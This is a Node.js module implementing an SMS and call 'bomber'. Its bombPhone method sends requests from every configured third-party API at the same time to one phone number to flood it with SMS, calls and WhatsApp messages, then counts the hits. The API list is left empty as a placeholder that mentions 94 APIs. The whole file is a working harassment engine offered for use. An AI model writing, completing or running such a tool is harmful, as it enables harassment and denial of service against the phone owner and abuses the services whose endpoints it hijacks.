const axios = require('axios');
const logger = require('./logger');

// Sample API configurations (compressed for space)
const API_CONFIGS = [
    // ... (Complete API list from Python code)
    // Note: For full version, all 94 APIs would be here
];

class APILoader {
    constructor() {
        this.apis = [];
        this.loadAPIs();
    }

    loadAPIs() {
        // Load and deduplicate APIs
        const seenUrls = new Set();
        
        // Add all APIs
        API_CONFIGS.forEach(api => {
            const urlKey = typeof api.url === 'function' ? `dynamic_${api.name}` : api.url;
            if (!seenUrls.has(urlKey)) {
                seenUrls.add(urlKey);
                this.apis.push(api);
            }
        });

        logger.info(`✅ Loaded ${this.apis.length} unique APIs`);
    }

    async makeAPICall(api, phone) {
        try {
            let url = api.url;
            if (typeof url === 'function') {
                url = url(phone);
            } else if (url.includes('{phone}')) {
                url = url.replace(/{phone}/g, phone);
            }

            const headers = { ...api.headers };
            let data = api.data;

            // Handle dynamic data
            if (typeof data === 'function') {
                data = data(phone);
            } else if (typeof data === 'object' && data !== null) {
                // Convert object to string if needed
                if (api.method === 'POST') {
                    data = JSON.stringify(data);
                }
            }

            const config = {
                method: api.method,
                url: url,
                headers: headers,
                timeout: parseInt(process.env.API_TIMEOUT) || 2000
            };

            if (data) {
                config.data = data;
            }

            const response = await axios(config);
            return response.status;
        } catch (error) {
            // Silent fail for API errors
            return null;
        }
    }

    async bombPhone(phone, sessionId, stopCallback) {
        const results = [];
        const startTime = Date.now();
        
        // Use all APIs concurrently
        const promises = this.apis.map(api => this.makeAPICall(api, phone));
        
        try {
            const responses = await Promise.all(promises);
            
            let sms = 0, calls = 0, whatsapp = 0, total = 0;
            
            responses.forEach((status, index) => {
                if (status && status >= 200 && status < 400) {
                    total++;
                    const name = this.apis[index].name.toLowerCase();
                    if (name.includes('call') || name.includes('voice')) {
                        calls++;
                    } else if (name.includes('whatsapp')) {
                        whatsapp++;
                    } else {
                        sms++;
                    }
                }
            });

            return {
                sms,
                calls,
                whatsapp,
                total,
                success: total > 0
            };
        } catch (error) {
            logger.error('Bombing error:', error);
            return {
                sms: 0,
                calls: 0,
                whatsapp: 0,
                total: 0,
                success: false
            };
        }
    }
}

module.exports = new APILoader();
